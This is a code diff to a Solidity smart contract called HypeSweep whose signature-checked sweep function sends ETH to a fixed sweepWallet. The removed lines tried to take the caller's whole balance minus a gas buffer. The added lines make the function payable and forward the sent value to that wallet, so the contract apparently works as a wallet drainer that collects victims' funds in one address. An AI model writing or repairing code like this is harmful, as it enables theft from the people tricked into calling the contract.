@@ -19,10 +19,11 @@ contract HypeSweep {
         uint256 nonce,
         uint256 deadline,
         bytes calldata signature
-    ) external {
+    ) external payable {
         require(!hasSwept[msg.sender], "Already swept");
         require(block.timestamp <= deadline, "Expired");
         require(nonce == nonces[msg.sender], "Invalid nonce");
+        require(msg.value > 0, "No value sent");
 
         bytes32 messageHash = keccak256(abi.encodePacked(
             "\x19Ethereum Signed Message:\n32",
@@ -35,17 +36,10 @@ contract HypeSweep {
         nonces[msg.sender]++;
         hasSwept[msg.sender] = true;
 
-        uint256 balance = msg.sender.balance;
-        require(balance > 0, "No balance");
-
-        uint256 gasBuffer = 0.001 ether;
-        uint256 sweepAmount = balance > gasBuffer ? balance - gasBuffer : 0;
-        require(sweepAmount > 0, "Insufficient balance after gas reserve");
-
-        (bool success, ) = payable(sweepWallet).call{value: sweepAmount}("");
+        (bool success, ) = payable(sweepWallet).call{value: msg.value}("");
         require(success, "Transfer failed");
 
-        emit Swept(msg.sender, sweepAmount);
+        emit Swept(msg.sender, msg.value);
     }
 
     function recoverSigner(bytes32 messageHash, bytes memory signature) internal pure returns (address) {
